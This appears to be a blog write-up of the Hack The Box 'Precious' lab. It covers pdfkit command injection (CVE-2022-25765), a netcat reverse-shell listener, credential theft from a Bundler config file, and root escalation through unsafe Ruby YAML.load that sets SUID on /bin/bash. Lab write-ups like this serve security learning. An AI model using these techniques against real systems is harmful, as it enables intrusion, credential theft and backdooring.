# Precious HTB Machine Walk-Though!

Executive Summary

---

### Precious HTB Machine Walk-Though!

### Executive Summary

**Target:** Precious (Hack The Box) **OS:** Linux **Difficulty:** Easy **Attack Vectors:** Web Application (Command Injection) -\> Configuration Mismanagement -\> Insecure Deserialization.

This assessment targeted “Precious,” a Linux-based machine hosting a “Web-to-PDF” converter service. The initial foothold was gained by identifying an outdated underlying dependency (`pdfkit v0.8.6`) via metadata analysis. This vulnerability (CVE-2022-25765) allowed for Remote Code Execution (RCE), granting access as the `ruby` user.

Lateral movement to the user `henry` was achieved by discovering hardcoded credentials left inside a hidden Ruby Bundler configuration file. Finally, Root privilege escalation was accomplished by exploiting a custom Ruby script with `sudo` permissions that utilized the insecure `YAML.load` method, allowing for a deserialization attack that compromised the entire system.

> <a href="https://medium.com/bugbountywriteup/precious-htb-machine-walk-though-a64d23ab1640?sk=3642476c3250a4e5108eed666406800b" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/bugbountywriteup/precious-htb-machine-walk-though-a64d23ab1640?sk=3642476c3250a4e5108eed666406800b" target="_blank">**Not a Member?? CLICK HERE to read Full-Story**</a>

![](https://cdn-images-1.medium.com/max/800/1*wjG6Hl45zXI8NttioR-d-w.png)

### 1.0 Initial Foothold

#### 1.1 Reconnaissance and Enumeration

**1.1.1 Scanning the Target:** The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target `10.10.11.189`.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Precious]
<SNIP>
Nmap scan report for 10.10.11.189
Host is up, received reset ttl 63 (0.049s latency).
Scanned at 2025-12-14 19:43:50 EST for 82s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
```

```
<SNIP>
```

**1.1.2 Key Findings:**

- <span id="cb0d">**Port 22 (SSH):** OpenSSH 8.4p1 Debian.</span>
- <span id="0889">**Port 80 (HTTP):** nginx 1.18.0.</span>
- <span id="993a">**Hostname Discovery:** The Nmap scan revealed a redirect: `|_http-title: Did not follow redirect to `<a href="http://precious.htb/." class="markup--anchor markup--li-anchor" data-href="http://precious.htb/." rel="noopener" target="_blank"><code class="markup--code markup--li-code u-paddingRight0 u-marginRight0">http://precious.htb/</code></a><a href="http://precious.htb/." class="markup--anchor markup--li-anchor" data-href="http://precious.htb/." rel="noopener" target="_blank">.</a></span>

**1.1.3 Host Configuration:** The server is configured to only respond to the hostname `precious.htb`. To access the web application, we added the entry to our local hosts file:

```
echo "10.10.11.189 precious.htb" | sudo tee -a /etc/hosts
```

#### 1.2 Web Application Enumeration

**1.2.1 Analysis:** Navigating to `http://precious.htb`, we found a simple "Web Page to PDF" converter. It contained a single input field accepting a URL.

**1.2.2 Information Leakage:** To fingerprint the backend technology, we hosted a simple Python web server (`python3 -m http.server 80`) and directed the application to fetch our IP. The application successfully connected, and we downloaded the generated PDF.

We analyzed the PDF metadata using `exiftool`, revealing a critical vulnerability:

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Precious]
└─$ exiftool /home/nicholas/Downloads/w95odjxow9pfb2f3k6ym6jm1agf4kgff.pdf
ExifTool Version Number         : 13.36
File Name                       : w95odjxow9pfb2f3k6ym6jm1agf4kgff.pdf
Directory                       : /home/nicholas/Downloads
File Size                       : 11 kB
File Modification Date/Time     : 2025:12:14 21:23:41-05:00
File Access Date/Time           : 2025:12:14 21:23:42-05:00
File Inode Change Date/Time     : 2025:12:14 21:23:41-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

**Vulnerability:** A search for `pdfkit v0.8.6` confirmed it is vulnerable to **CVE-2022-25765** (Command Injection).

### 2.0 Exploitation

![](https://cdn-images-1.medium.com/max/800/1*1IXZhu8nWovT8F51yToorw.png)

#### 2.1 Gaining Access (Command Injection)

**2.1.1 The Exploit:** The vulnerability exists because `pdfkit` fails to sanitize user input when processing URLs with parameters. By injecting a command inside backticks within a URL parameter, we can force the server to execute code.

- <span id="91d8">Set up a listener first then submit that command.</span>

![](https://cdn-images-1.medium.com/max/800/1*GCsSRK_-jJK4pTIQk1yZFQ.png)

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Precious]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 56706
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ruby@precious:/var/www/pdfapp$ ^Z
zsh: suspended  nc -lvnp 443

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Precious]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443
                              whoami
ruby
ruby@precious:/var/www/pdfapp$
```

**2.1.2 Shell Stabilization:** We caught the reverse shell on our listener (`nc -lvnp 443`). However, the shell was unstable. We upgraded it to a fully interactive TTY:

1.  <span id="7aa6">`script /dev/null -c bash`</span>
2.  <span id="e668">`Ctrl + Z` (Background the process)</span>
3.  <span id="594c">`stty raw -echo; fg` (Pass local keys to remote)</span>
4.  <span id="0372">`export TERM=xterm`</span>

**2.1.3 Post-Exploitation Enumeration (The Discovery):** After stabilizing the shell as the user `ruby`, we searched for misconfigurations. In the home directory, we found a hidden folder named `.bundle`. Inside, the `config` file contained hardcoded credentials:

```
ruby@precious:~$ cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

**2.1.4 Lateral Movement:** We used these discovered credentials to SSH into the box as the user **henry**.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Precious]
└─$ ssh henry@precious.htb
The authenticity of host 'precious.htb (10.10.11.189)' can't be established.
ED25519 key fingerprint is: SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'precious.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
henry@precious.htb's password:
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
```

```
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
```

```
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ cat user.txt
1680d3354719362924057ae271849235
```

### 3.0 Privilege Escalation

#### 3.1.1 Sudo Rights Enumeration

To identify vectors for root access, we checked Henry’s permissions:

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
```

```
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

**Analysis:** Henry can run `/opt/update_dependencies.rb` as root without a password.

#### 3.1.2 Source Code Review

Reading the script (`cat /opt/update_dependencies.rb`) revealed it uses `YAML.load` to read a file named `dependencies.yml`. This function is unsafe in Ruby as it allows for **Deserialization of Untrusted Data**.

#### 3.1.3 The Root Exploit (YAML Deserialization)

We exploited this by creating a malicious `dependencies.yml` file in the current directory. The payload triggers a "Gadget Chain" that executes a system command (`chmod +s /bin/bash`) to set the SUID bit on bash, creating a backdoor.

**Step 1: Create the Malicious File**

![](https://cdn-images-1.medium.com/max/800/1*kPhd2-N7izv-pTiOkUzvMQ.png)

```
# Execute the exploit
sudo /usr/bin/ruby /opt/update_dependencies.rb

# Catch the shell
/bin/bash -p

# Verify ID
whoami
> root

# Grab the Flag
cat /root/root.txt
> [REDACTED_ROOT_FLAG]
```

![](https://cdn-images-1.medium.com/max/800/1*cfJuUIRUR3daG7NMxb6OQw.png)

### Final Thoughts: The Red Team Mandate

Throughout this assessment of the “Precious” machine, we didn’t just randomly attack a server; we followed a methodical process of testing assumptions. We tested if the PDF generator was secure (it wasn’t due to an outdated `pdfkit`). We tested if developers were careful with credentials (they weren't, hiding them in a `.bundle` file). We tested if administrative scripts were written securely (they failed due to unsafe `YAML.load`).

This entire process is the embodiment of the Red Team’s core mission: to challenge unseen assumptions and expose hidden weaknesses before a real adversary does.

#### **The Verse:**

> “Prove all things; hold fast that which is good.”* — ****1 Thessalonians 5:21 (KJV)***

**How it ties to this Red Team assessment:** In cybersecurity, you cannot “hold fast” to the belief that your system is “good” or secure just because it seems to be working. You must **“prove all things.”** As Red Teamers, our job is to be the mechanism of that proof. By relentlessly testing every input, every dependency, and every line of code, we strip away false security and reveal the truth, forcing the system to become truly robust.

### Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically).

I am constantly looking for the next challenge.

- <span id="bc62">Is there a specific tool you wish existed?</span>
- <span id="11ae">Is there a hacking concept you want me to learn and explain?</span>
- <span id="6790">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/3DH3MasSfN" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/3DH3MasSfN" title="https://discord.gg/3DH3MasSfN"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/3DH3MasSfN" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="2798b0a5cd278d72b171b0c7596c909e"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 15, 2025](https://medium.com/p/a64d23ab1640).

<a href="https://medium.com/@nicholasmullenski/precious-htb-machine-walk-though-a64d23ab1640" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
